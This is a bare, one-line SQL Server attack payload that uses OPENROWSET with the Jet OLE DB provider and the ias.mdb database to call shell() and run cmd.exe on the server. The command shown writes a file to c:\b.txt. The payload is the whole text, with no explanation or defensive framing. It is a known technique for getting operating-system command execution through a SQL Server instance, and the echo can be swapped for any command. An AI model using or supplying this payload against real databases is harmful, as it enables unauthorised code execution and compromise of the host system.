select * from openrowset(‘microsoft.jet.oledb.4.0′,’;database=c:\windows\system32\ias\ias.mdb’,'select shell(“cmd.exe /c echo a&gt;c:\b.txt”)’)
